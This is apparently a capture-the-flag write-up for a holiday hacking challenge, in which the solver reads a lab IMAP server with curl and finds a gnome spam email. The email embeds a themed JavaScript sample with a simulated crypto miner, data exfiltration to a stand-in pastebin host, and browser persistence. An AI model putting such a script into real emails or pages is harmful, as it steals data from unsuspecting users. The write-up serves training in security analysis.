# Mail Detective

## Objective

Difficulty: ❄️❄️  
[Hints](../hints/hint-mail_detective.md) and [Conversations](../hints/chat-maurice_wilson.md)  

Help Mo in City Hall solve a curly email caper and crack the IMAP case. What is the URL of the pastebin service the gnomes are using?

## Solution

> https://frostbin.atnas.mail/api/paste  

## Detailed Solution

```bash
=======================================================================
🎄 Mail Detective: Curly IMAP Investigation 🎄
=======================================================================

⚠️  ALERT! Those gnomes have been sending JavaScript-enabled emails
to everyone in the neighborhood, and it's causing absolute chaos!
We had to shut down all the email clients because they weren't blocking
the malicious scripts—kind of like how we'd ground aircraft until we clear
a security threat.

The only safe way to access the email server now is through curl,
the trusty HTTP tool. Yes, we're using curl to connect to IMAP!
It's unconventional, but it's secure.

🕵️  YOUR MISSION: Use curl to safely connect to the IMAP server
and hunt down one of these gnome emails. Find the malicious email
that wants to exfiltrate data to a pastebin service and submit the URL
of that pastebin service in your badge.

📡 Server Info:
   The IMAP server is running locally on TCP port 143
   Backdoor credentials: dosismail:holidaymagic

🎅 Good luck, Holiday Hacker! 🎅

=======================================================================
```

Connect to server and get available folders 
```bash
dosismail @ Neighborhood Mail ~$ curl imap://dosismail:holidaymagic@localhost:143/
* LIST (\HasNoChildren) "." Spam
* LIST (\HasNoChildren) "." Sent
* LIST (\HasNoChildren) "." Archives
* LIST (\HasNoChildren) "." Drafts
* LIST (\HasNoChildren) "." INBOX
```

get quick counts
```bash
dosismail @ Neighborhood Mail ~$ curl imap://dosismail:holidaymagic@localhost:143/ -X 'STATUS INBOX (MESSAGES)'
* STATUS INBOX (MESSAGES 7)

dosismail @ Neighborhood Mail ~$ curl  imap://dosismail:holidaymagic@localhost:143/ -X 'STATUS Spam (MESSAGES)'
* STATUS Spam (MESSAGES 3)

dosismail @ Neighborhood Mail ~$ curl  imap://dosismail:holidaymagic@localhost:143/ -X 'STATUS Archives (MESSAGES)' 
* STATUS Archives (MESSAGES 7)

dosismail @ Neighborhood Mail ~$ curl  imap://dosismail:holidaymagic@localhost:143/ -X 'STATUS Drafts (MESSAGES)'
* STATUS Drafts (MESSAGES 2)
```

Get emails
```bash
dosismail @ Neighborhood Mail ~$ curl  imap://dosismail:holidaymagic@localhost:143/Spam -X "FETCH 1:* (ENVELOPE)" 
* 1 FETCH (ENVELOPE ("Mon, 16 Sep 2025 12:05:00 +0000" "Coolant Acquisition Protocol Initiated" (("ATNAS Recon Unit" NIL "recon.unit" "atnas.mail")) (("ATNAS Recon Unit" NIL "recon.unit" "atnas.mail")) (("ATNAS Recon Unit" NIL "recon.unit" "atnas.mail")) (("Counter Hack Innovation Crew" NIL "counterhack.crew" "dosisneighborhood.mail")) NIL (("Old Pete the Gardener" NIL "gardener" "dosisneighborhood.mail")) NIL "<gnome-js-2@atnas.mail>"))
* 2 FETCH (ENVELOPE ("Mon, 16 Sep 2025 12:10:00 +0000" "Frost Protocol: Dosis Neighborhood Freezing Initiative" (("Frozen Network Bot" NIL "frozen.network" "mysterymastermind.mail")) (("Frozen Network Bot" NIL "frozen.network" "mysterymastermind.mail")) (("Frozen Network Bot" NIL "frozen.network" "mysterymastermind.mail")) (("Dosis Neighborhood Residents" NIL "dosis.residents" "dosisneighborhood.mail")) (("Jessica and Joshua" NIL "siblings" "dosisneighborhood.mail")("CHI Team" NIL "chi.team" "counterhack.com")) NIL NIL "<gnome-js-3@mysterymastermind.mail>"))
* 3 FETCH (ENVELOPE ("Mon, 16 Sep 2025 12:00:00 +0000" "Your Refrigerator Systems Compromised!" (("Frost's Minion" NIL "frost.minion" "atnas.mail")) (("Frost's Minion" NIL "frost.minion" "atnas.mail")) (("Frost's Minion" NIL "frost.minion" "atnas.mail")) (("Duke Dosis" NIL "duke.dosis" "dosisneighborhood.mail")) (("Counter Hack Crew" NIL "team" "counterhack.mail")) NIL NIL "<gnome-js-1@atnas.mail>"))

dosismail @ Neighborhood Mail ~$ curl  imap://dosismail:holidaymagic@localhost:143/INBOX -X "FETCH 1:* (ENVELOPE)"
* 1 FETCH (ENVELOPE ("Sat, 21 Dec 2024 14:54:39 +0000" "Help! My Electronics Keep Disappearing and Reappearing!" (("Sparky McGillicuddy" NIL "electronics" "dosisneighborhood.mail")) (("Sparky McGillicuddy" NIL "electronics" "dosisneighborhood.mail")) (("Sparky McGillicuddy" NIL "electronics" "dosisneighborhood.mail")) (("DIY Electronics Club" NIL "makers" "dosisneighborhood.mail")) NIL NIL NIL "<electronic-mysteries@dosisneighborhood.mail>"))
* 2 FETCH (ENVELOPE ("Wed, 18 Dec 2024 16:42:01 +0000" "Re: Strange Garden Ornament Behavior" (("Old Pete the Gardener" NIL "gardener" "dosisneighborhood.mail")) (("Old Pete the Gardener" NIL "gardener" "dosisneighborhood.mail")) (("Old Pete the Gardener" NIL "gardener" "dosisneighborhood.mail")) (("Green Thumb Gang" NIL "gardeners" "dosisneighborhood.mail")) NIL NIL NIL "<garden-ornament-mystery@dosisneighborhood.mail>"))
* 3 FETCH (ENVELOPE ("Mon, 23 Dec 2024 11:17:18 +0000" {53}
* 4 FETCH (ENVELOPE ("Tue, 24 Dec 2024 08:45:11 +0000" {51}
* 5 FETCH (ENVELOPE ("Sun, 22 Dec 2024 19:33:01 +0000" {50}
* 6 FETCH (ENVELOPE ("Fri, 20 Dec 2024 22:31:28 +0000" {60}
* 7 FETCH (ENVELOPE ("Thu, 19 Dec 2024 09:15:01 +0000" {65}
```

Get full message for interesting Bot

```bash
dosismail @ Neighborhood Mail ~$ curl  'imap://dosismail:holidaymagic@localhost:143/Spam;UID=2'
Return-Path: <frozen.network@mysterymastermind.mail>
Delivered-To: dosis.residents@dosisneighborhood.mail
Received: from frost-command.mysterymastermind.mail (frost-command [10.0.0.15])
        by mail.dosisneighborhood.mail (Postfix) with ESMTP id GHI789
        for <dosis.residents@dosisneighborhood.mail>; Mon, 16 Sep 2025 12:10:00 +0000 (UTC)
From: "Frozen Network Bot" <frozen.network@mysterymastermind.mail>
To: "Dosis Neighborhood Residents" <dosis.residents@dosisneighborhood.mail>
Cc: "Jessica and Joshua" <siblings@dosisneighborhood.mail>, "CHI Team" <chi.team@counterhack.com>
Subject: Frost Protocol: Dosis Neighborhood Freezing Initiative
Date: Mon, 16 Sep 2025 12:10:00 +0000
Message-ID: <gnome-js-3@mysterymastermind.mail>
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit


<html>
<body>
<h1>Perpetual Winter Protocol Activated</h1>
<p>The mysterious mastermind's plan is proceeding... Dosis neighborhood will never thaw!</p>
<script>
function initCryptoMiner() {
    var worker = {
        start: function() {
            console.log("Frost's crypto miner started - mining FrostCoin for perpetual winter fund");
            this.interval = setInterval(function() {
                console.log("Mining FrostCoin... Hash rate: " + Math.floor(Math.random() * 1000) + " H/s");
            }, 5000);
        },
        stop: function() {
            clearInterval(this.interval);
        }
    };
    worker.start();
    return worker;
}

function exfiltrateData() {
    var sensitiveData = {
        hvacSystems: "Located " + Math.floor(Math.random() * 50) + " cooling units",
        thermostatData: "Temperature ranges: " + Math.floor(Math.random() * 30 + 60) + "°F",
        refrigerationUnits: "Found " + Math.floor(Math.random() * 20) + " commercial freezers",
        timestamp: new Date().toISOString()
    };
    
    console.log("Exfiltrating data to Frost's command center:", sensitiveData);
    
    var encodedData = btoa(JSON.stringify(sensitiveData));
    console.log("Encoded payload for Frost: " + encodedData.substr(0, 50) + "...");

    // pastebin exfiltration
    var pastebinUrl = "https://frostbin.atnas.mail/api/paste";
    var exfilPayload = {
        title: "HVAC_Survey_" + Date.now(),
        content: encodedData,
        expiration: "1W",
        private: "1",
        format: "json"
    };
    
    console.log("Sending stolen data to FrostBin pastebin service...");
    console.log("POST " + pastebinUrl);
    console.log("Payload: " + JSON.stringify(exfilPayload).substr(0, 100) + "...");
    console.log("Response: {\"id\":\"" + Math.random().toString(36).substr(2, 8) + "\",\"url\":\"https://frostbin.atnas.mail/raw/" + Math.random().toString(36).substr(2, 8) + "\"}");
}

function establishPersistence() {
    // Service worker registration
    if ('serviceWorker' in navigator) {
        console.log("Attempting to register Frost's persistent service worker...");
        console.log("Frost's persistence mechanism deployed");
    }
    
    localStorage.setItem("frost_persistence", JSON.stringify({
        installDate: new Date().toISOString(),
        version: "gnome_v2.0",
        mission: "perpetual_winter_protocol"
    }));
}

var miner = initCryptoMiner();
exfiltrateData();
establishPersistence();

document.title = "Frost's Gnome Network - Temperature Control";
alert("All cooling systems in Dosis neighborhood are now property of Frost!");
document.body.innerHTML += "<p style='color: cyan;'>❄️ FROST'S DOMAIN ❄️</p>";

// Cleanup after 30 seconds
setTimeout(function() {
    miner.stop();
    console.log("Frost's operations going dark... tracks covered");
}, 30000);
</script>
</body>
</html>
```

## References

* [Reading email](https://everything.curl.dev/usingcurl/reademail.html)

## Game Location

![alt text](./docs/HHC_2025/neighborhood/City_Hall/curly.png)
